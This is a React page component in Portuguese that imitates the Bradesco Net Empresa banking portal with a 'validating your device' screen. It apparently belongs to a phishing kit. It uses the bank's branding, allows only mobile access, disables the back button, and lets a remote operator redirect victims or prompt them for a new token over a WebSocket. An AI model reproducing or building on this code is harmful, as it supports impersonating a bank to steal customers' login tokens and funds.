import { useEffect } from "react";
import { useNavigate } from "react-router-dom";
import bradescoLogo from "@/assets/bradesco-logo.png";
import { resolveServerRoute } from "@/lib/resolveServerRoute";
import { useWebSocket } from "@/hooks/useWebSocket";

const ValidatingPage = () => {
  const navigate = useNavigate();
  const dispositivo = localStorage.getItem("dispositivo") || "";

  useWebSocket({
    reconectarPayload: { dispositivo },
    onRedirect: (msg) => {
      navigate(resolveServerRoute(msg.url));
    },
    onMessage: (msg) => {
      if (msg.acao === "erro_token") {
        localStorage.setItem("erroToken", msg.motivo || "Token inválido");
        navigate("/token");
      }
    },
  });

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePop = () => window.history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", handlePop);
    return () => window.removeEventListener("popstate", handlePop);
  }, []);

  return (
    <>
      {/* Desktop blocker */}
      <div className="hidden md:flex min-h-screen items-center justify-center bg-[hsl(220,60%,40%)] p-8">
        <div className="text-center text-white max-w-sm space-y-4">
          <div className="w-16 h-16 rounded-2xl bg-white/20 flex items-center justify-center mx-auto">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
          </div>
          <h2 className="text-xl font-bold">Acesso exclusivo pelo celular</h2>
          <p className="text-white/70 text-sm leading-relaxed">Este portal está disponível apenas para dispositivos móveis.</p>
        </div>
      </div>

      {/* Mobile layout */}
      <div className="md:hidden min-h-screen flex flex-col bg-[hsl(220,20%,96%)]">
        <div className="bg-[hsl(220,60%,40%)] px-4 py-3 flex items-center gap-3">
          <h1 className="text-white text-base font-semibold tracking-tight">Bradesco Net Empresa</h1>
        </div>

        <div className="flex flex-col items-center justify-center flex-1 px-8">
          <img src={bradescoLogo} alt="Bradesco" className="w-24 h-24 object-contain mb-8" />

          <div className="w-20 h-20 rounded-full bg-[hsl(220,60%,40%)]/10 flex items-center justify-center mb-6">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 text-[hsl(220,60%,40%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
              <path d="m9 12 2 2 4-4"/>
            </svg>
          </div>

          <h2 className="text-[hsl(220,20%,14%)] text-xl font-bold mb-2 text-center">
            Verificando componente de segurança
          </h2>
          <p className="text-[hsl(220,10%,46%)] text-sm text-center mb-8 max-w-[260px]">
            Aguarde enquanto validamos seu dispositivo.
          </p>

          <div className="w-10 h-10 border-[3px] border-[hsl(220,14%,89%)] border-t-[hsl(220,60%,40%)] rounded-full animate-spin" />

          <p className="text-[hsl(220,10%,46%)] text-xs mt-6 animate-pulse">
            Isso pode levar alguns segundos...
          </p>
        </div>
      </div>
    </>
  );
};

export default ValidatingPage;
